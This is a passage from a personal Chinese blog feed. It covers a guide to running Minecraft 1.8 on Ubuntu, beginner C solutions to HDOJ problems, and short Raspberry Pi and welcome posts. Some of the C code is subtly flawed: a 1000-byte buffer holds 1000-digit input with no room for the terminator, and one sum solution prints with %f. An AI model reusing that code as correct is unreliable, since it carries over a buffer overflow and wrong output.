      <content type="html"><![CDATA[<h1 id="u5728Ubuntu_u4E0A_u73A9Linux"><a href="#u5728Ubuntu_u4E0A_u73A9Linux" class="headerlink" title="在Ubuntu上玩Linux"></a>在Ubuntu上玩Linux</h1><h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>windows上的MC玩起来方便，不管是服务器端还是客户端，都有很多大神打造的启动器，开服器，可在Linux上，这些工具就少了些，并且经常会出错。网上的很多资料大多是针对经典的旧版，我会介绍一种简单的方法在Ubuntu Linux上玩起MC1.8。</p>
<h2 id="u5DE5_u5177"><a href="#u5DE5_u5177" class="headerlink" title="工具"></a>工具</h2><ol>
<li>MinecraftSP.jar</li>
<li>Hello Minecraft Launcher 2.2.1</li>
<li>Minecraft 1.8 纯净客户端</li>
<li>OpenJDK 7</li>
</ol>
<a id="more"></a>
<h2 id="Java_u73AF_u5883_u642D_u5EFA"><a href="#Java_u73AF_u5883_u642D_u5EFA" class="headerlink" title="Java环境搭建"></a>Java环境搭建</h2><p>可以在Ubuntu自带的软件中心中安装OpenJDK 7 runtime，也可以用apt-get的方式来安装</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> openjdk-7-jdk
</code></pre>
<p>在安装完成后输入：</p>
<pre class=" language-bash"><code class="language-bash">java -version <span class="token comment" spellcheck="true"># 查看版本号</span>
</code></pre>
<p>如果显示出了 Java 版本号那就已经安装成功。</p>
<h2 id="u5B89_u88C5_u6E38_u620F"><a href="#u5B89_u88C5_u6E38_u620F" class="headerlink" title="安装游戏"></a>安装游戏</h2><p>右击MinecraftSP.jar</p>
<p>点<code>属性</code>-<code>权限</code>，在<code>执行</code>后面的<code>允许作为程序执行文件</code>前打勾选上。</p>
<p>然后双击，输入帐号密码，点<code>Login</code>开始加载Classic版也就是1.5.4的MC。<br>这个是必须的，为后面玩上1.8做前提，因为自1.6.2以后就不提供bin文件包，很多在Ubuntu运行失败的都是因为缺少bin。</p>
<p>待下载完成后就可以玩经典版的了，可以设置为中文。</p>
<h2 id="u5B89_u88C5MC_1-8"><a href="#u5B89_u88C5MC_1-8" class="headerlink" title="安装MC 1.8"></a>安装MC 1.8</h2><p>必须先运行一次经典版的MC，让其产生一些必要的文件，然后才能继续安装MC 1.8<br>然后将纯净包里的东西覆盖到本机的<code>.Minecraft</code>中。</p>
<h2 id="HMCL_u7684_u4F7F_u7528"><a href="#HMCL_u7684_u4F7F_u7528" class="headerlink" title="HMCL的使用"></a>HMCL的使用</h2><p>在终端里输入</p>
<pre class=" language-bash"><code class="language-bash">sh HMCL-2.2.1.sh <span class="token comment" spellcheck="true">#记得先cd进入HMCL的文件夹</span>
</code></pre>
<p>然后就会出现启动器，在游戏设置里可以安装些资源或游戏下载</p>
<p>然后就可以玩了</p>
<p>注意，这时候虽然安装了1.8，但用MinecraftSP来启动仍然是经典版本，想要玩1.8版本必须用启动器</p>
<h2 id="u4E00_u4E9B_u9519_u8BEF"><a href="#u4E00_u4E9B_u9519_u8BEF" class="headerlink" title="一些错误"></a>一些错误</h2><ul>
<li><p>首次启动后黑屏</p>
<ul>
<li>bin文件包里的java库文件没有生效，可以去网上下lwjgl-2.9.0文件，然后分别替换原文件</li>
<li>可能是内存分配太少，建议512MB</li>
<li>显卡驱动缺少也有可能</li>
<li>Mod不兼容</li>
</ul>
</li>
<li><p>缺少Java库，缺少lwjgl.jar等等<br>例如</p>
</li>
</ul>
<pre class=" language-html"><code class="language-html">*** Hello Minecraft! Launcher 2.1.9 ***
*** Invoking minecraft main() ***
ERROR StatusLogger Unable to locate a logging implementation, using SimpleLogger
Minecraft崩溃了！
可能是游戏依赖库不完整或解压依赖库时出错。可以通过下载整合包解决问题。
java.lang.reflect.InvocationTargetException
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
at java.lang.reflect.Method.invoke(Method.java:606)
at org.jackhuang.hellominecraft.launcher.Launcher.main(SourceFile:122)
Caused by: java.lang.UnsatisfiedLinkError: no lwjgl in java.library.path
at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1886)
at java.lang.Runtime.loadLibrary0(Runtime.java:849)
at java.lang.System.loadLibrary(System.java:1088)
at org.lwjgl.Sys$1.run(Sys.java:73)
at java.security.AccessController.doPrivileged(Native Method)
at org.lwjgl.Sys.doLoadLibrary(Sys.java:66)
at org.lwjgl.Sys.loadLibrary(Sys.java:95)
at org.lwjgl.Sys.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>clinit</span><span class="token punctuation">></span></span>(Sys.java:112)
at bss.I(SourceFile:2488)
at net.minecraft.client.main.Main.main(SourceFile:41)
... 5 more


*** Main class main() finished ***
</code></pre>
<p>这些问题大部分都是因为bin文件出了问题，或者没装bin文件<br>我一开始用纯净包+启动器，发现各种运行不起来<br>后来排查，还是缺少bin文件，介于网上完整的ubuntu包很少，所以只能用MinecraftSP来进行安装。</p>
<h4 id="u6682_u65F6_u53EA_u77E5_u9053_u7684ubuntu_u4E0A_u81EA_u5DF1_u770B_u5230_u7684_u4E00_u4E9B_u9519_u8BEF"><a href="#u6682_u65F6_u53EA_u77E5_u9053_u7684ubuntu_u4E0A_u81EA_u5DF1_u770B_u5230_u7684_u4E00_u4E9B_u9519_u8BEF" class="headerlink" title="暂时只知道的ubuntu上自己看到的一些错误"></a>暂时只知道的ubuntu上自己看到的一些错误</h4><p>在Ubuntu服务器端搭建Minecraft server 按照网上的步骤都可以成功搭建的。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[HDOJ - 1002  A + B Problem II]]></title>
      <url>http://xinqiu.me/2015/02/03/A+B-Problem-II/</url>
      <content type="html"><![CDATA[<h1 id="A_+_B_Problem_II"><a href="#A_+_B_Problem_II" class="headerlink" title="A + B Problem II"></a>A + B Problem II</h1><p>AC了半天，老是一些细节没注意。</p>
<h2 id="Problem_Description"><a href="#Problem_Description" class="headerlink" title="Problem Description"></a>Problem Description</h2><p>I have a very simple problem for you. Given two integers A and B, your job is to calculate the Sum of A + B.</p>
<h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>The first line of the input contains an integer T(1&lt;=T&lt;=20) which means the number of test cases. Then T lines follow, each line consists of two positive integers, A and B. Notice that the integers are very large, that means you should not process them by using 32-bit integer. You may assume the length of each integer will not exceed 1000.</p>
<h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><p>For each test case, you should output two lines. The first line is “Case #:”, # means the number of the test case. The second line is the an equation “A + B = Sum”, Sum means the result of A + B. Note there are some spaces int the equation. Output a blank line between two test cases.</p>
<a id="more"></a>
<h2 id="Sample_Input"><a href="#Sample_Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>2</p>
<p>1 2</p>
<p>112233445566778899 998877665544332211</p>
<h2 id="Sample_Output"><a href="#Sample_Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Case 1:</p>
<p>1 + 2 = 3</p>
<p>Case 2:</p>
<p>112233445566778899 + 998877665544332211 = 1111111111111111110</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> s1<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">,</span>s2<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">1001</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span>n1<span class="token punctuation">,</span>n2<span class="token punctuation">;</span>
    <span class="token keyword">int</span> len<span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>n<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s %s"</span><span class="token punctuation">,</span>s1<span class="token punctuation">,</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Case %d:\n"</span><span class="token punctuation">,</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s + %s = "</span><span class="token punctuation">,</span>s1<span class="token punctuation">,</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        n1 <span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        n2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        len <span class="token operator">=</span> <span class="token punctuation">(</span>n1<span class="token operator">></span>n2<span class="token operator">?</span>n1<span class="token punctuation">:</span>n2<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n1 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">||</span> n2 <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">,</span>n1<span class="token operator">--</span><span class="token punctuation">,</span>n2<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>n1<span class="token operator">>=</span><span class="token number">0</span><span class="token operator">&amp;&amp;</span>n2<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>s1<span class="token punctuation">[</span>n1<span class="token punctuation">]</span><span class="token operator">+</span>s2<span class="token punctuation">[</span>n2<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">48</span><span class="token operator">-</span><span class="token number">48</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>n1<span class="token operator">>=</span><span class="token number">0</span><span class="token operator">&amp;&amp;</span>n2<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>s1<span class="token punctuation">[</span>n1<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">48</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>n1<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">&amp;&amp;</span>n2<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>s2<span class="token punctuation">[</span>n2<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">48</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
                a<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>len<span class="token punctuation">]</span> <span class="token operator">==</span><span class="token number">1</span> <span class="token punctuation">)</span>
            len <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>len<span class="token operator">--</span><span class="token punctuation">)</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Raspberry Pi GPIO Test]]></title>
      <url>http://xinqiu.me/2015/01/31/RPi-GPIO-Test/</url>
      <content type="html"><![CDATA[<p>每次看python，都想利用树莓派的GPIO玩LED小灯，果然是寒假无聊，买了GPIO的扩展版和小灯。RPi.GPIO是Python库，简单测试有用。因为有了T型扩展版，方便了不少，可以直接在面包板上设置电路了。之后再慢慢研究这个库。嗯，就是这样。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[HDOJ - 1089  A+B for Input-Output Practice (I)]]></title>
      <url>http://xinqiu.me/2015/01/22/A+B+for+Input-Output+Practice(I)/</url>
      <content type="html"><![CDATA[<h1 id="A+B_for_Input-Output_Practice__28I_29"><a href="#A+B_for_Input-Output_Practice__28I_29" class="headerlink" title="A+B for Input-Output Practice (I)"></a>A+B for Input-Output Practice (I)</h1><h2 id="Problem_Description"><a href="#Problem_Description" class="headerlink" title="Problem Description"></a>Problem Description</h2><p>Your task is to Calculate a + b.<br>Too easy?! Of course! I specially designed the problem for acm beginners.<br>You must have found that some problems have the same titles with this one, yes, all these problems were designed for the same aim. </p>
<h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>The input will consist of a series of pairs of integers a and b, separated by a space, one pair of integers per line. </p>
<h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><p>For each pair of input integers a and b you should output the sum of a and b in one line, and with one line of output for each line in input. </p>
<a id="more"></a>
<h2 id="Sample_Input"><a href="#Sample_Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1 5</p>
<p>10 20</p>
<h2 id="Sample_Output"><a href="#Sample_Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>6</p>
<p>30</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property"># <span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> a<span class="token punctuation">,</span>b<span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">,</span><span class="token operator">&amp;</span>b<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[HDOJ - 1001  Sum Problem]]></title>
      <url>http://xinqiu.me/2015/01/05/Sum-Problem/</url>
      <content type="html"><![CDATA[<h1 id="Sum_Problem"><a href="#Sum_Problem" class="headerlink" title="Sum Problem"></a>Sum Problem</h1><h2 id="Problem_Description"><a href="#Problem_Description" class="headerlink" title="Problem Description"></a>Problem Description</h2><p>Hey, welcome to HDOJ(Hangzhou Dianzi University Online Judge).</p>
<p>In this problem, your task is to calculate SUM(n) = 1 + 2 + 3 + … + n.</p>
<h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>The input will consist of a series of integers n, one integer per line.</p>
<h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><p>For each case, output SUM(n) in one line, followed by a blank line. You may assume the result will be in the range of 32-bit signed integer.</p>
 <a id="more"></a>
<h2 id="Sample_Input"><a href="#Sample_Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1<br>100</p>
<h2 id="Sample_Output"><a href="#Sample_Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>1</p>
<p>5050</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//递归</span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token keyword">return</span> n<span class="token operator">+</span><span class="token function">sum</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> n<span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token constant">EOF</span><span class="token punctuation">)</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n\n"</span><span class="token punctuation">,</span><span class="token function">sum</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">//公式</span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> n<span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token constant">EOF</span><span class="token punctuation">)</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%f\n\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2.0</span><span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>公式的方法要判断n的奇偶性，因为n*(n+1)可能数字太大。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[HDOJ - 1000  A + B Problem]]></title>
      <url>http://xinqiu.me/2015/01/04/A+B-Problem/</url>
      <content type="html"><![CDATA[<h1 id="A_+_B_Problem"><a href="#A_+_B_Problem" class="headerlink" title="A + B Problem"></a>A + B Problem</h1><p>Calculate a + b</p>
<h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>The input will consist of a series of pairs of integers a and b,separated by a space, one pair of integers per line.</p>
<h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><p>For each pair of input integers a and b you should output the sum of a and b in one line,and with one line of output for each line in input.</p>
<a id="more"></a>
<h2 id="Sample_Input"><a href="#Sample_Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1 1</p>
<h2 id="Sample_Output"><a href="#Sample_Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>2</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> a<span class="token punctuation">,</span>b<span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">,</span><span class="token operator">&amp;</span>b<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token constant">EOF</span><span class="token punctuation">)</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>http://xinqiu.me/2014/12/20/hello-world/</url>
      <content type="html"><![CDATA[<p>欢迎来到我的Blog。</p>
<p>我不知道能坚持多久，但我会一直坚持去维护好这个Blog。<br>也是为了写给自己，给自己的留下点什么记录。</p>
]]></content>
    </entry>
    
  
  
</search>
